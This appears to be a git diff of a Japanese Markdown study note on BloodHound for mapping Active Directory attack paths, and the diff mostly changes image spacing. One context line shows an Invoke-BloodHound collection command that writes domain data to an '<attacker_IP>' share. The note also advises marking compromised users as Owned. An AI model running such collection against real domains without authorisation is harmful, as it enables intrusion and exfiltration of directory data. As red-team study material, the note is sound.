@@ -76,7 +76,9 @@ Legacyでは、BloodHoundとSharpHoundの互換性に気をつける必要があ
 1. BloodHoundを起動し、Download Collectorsからデータ収集ツールをダウンロードする
 	- Active Directoryに対しデータ収集：SharpHound
 	- Entra IDに対しデータ収集：AzureHound
+
 ![](../画像ファイル/Pasted%20image%2020251006071117.png)
+
 $$Download　Collectorsのページ$$
 
 2. zipファイルを解凍する（自分は`/opt/bloodhound`配下に解凍）
@@ -125,8 +127,11 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory \\<attacker_IP>\share -
 > - ローカルGPOは収集できない
 
 3. 攻撃者のマシンに戻り、BloodHoundのAdministration > File IngestでUpload Fileを実行し、SharpHoundの実行結果であるzipファイルをアップロードする
+
 ![](../画像ファイル/Pasted%20image%2020251006074057.png)
+
 $$File　IngestのStatusがCompleteになれば分析準備OK$$
+
 - 取り込んだデータの削除は、Administration > Database Managementから可能
 
 ---
@@ -148,16 +153,21 @@ $$File　IngestのStatusがCompleteになれば分析準備OK$$
 | Execution Privileges    | あるオブジェクトに対するリモートコマンド実行権限            |
 | Inbound Object Control  | 他のオブジェクトがこのオブジェクトに対してどのような権限を持っているか |
 | Outbound Object Control | このオブジェクトが他のオブジェクトに対してどのような権限を持っているか |
+
 ![](../画像ファイル/Pasted%20image%2020251007072812.png)
+
 $$エンティティパネル$$
 
 - ノードを右クリックすると、Add to Owned（侵害済みリストに追加）などが可能
 	- 💀：Ownedリストに追加されたノードを意味する
 	- アタックベクターを可視化するため、侵害したユーザーは==必ずAdd to Ownedする==こと
-![ 200](../画像ファイル/Pasted%20image%2020251007071811.png)
+
+![](../画像ファイル/Pasted%20image%2020251007071811.png)
 
 - 💎："HIGH VALUE"を意味し、特に重要なオブジェクトや侵害できると大きなメリットがあるオブジェクトを指す
+
 ![](../画像ファイル/Pasted%20image%2020251007064333.png)
+
 $$ノードのアイコンの意味$$
 
 ## edgeについて
@@ -171,6 +181,7 @@ $$ノードのアイコンの意味$$
 		- 詳細は公式ドキュメントでEdgeの名前を検索
 		- ⚠️古いエクスプロイトの場合もあるので、エクスプロイト技法については公式ドキュメントを読む
 	- Opsec Considerations：レッドチームメンバーが検知回避で考慮すべき点など
+
 ![](../画像ファイル/Pasted%20image%2020251007064618.png)
 $$edgeのプロパティを表示$$
 - その他の情報は、公式ドキュメントの「[Resources](https://bloodhound.specterops.io/resources/overview)」を閲覧
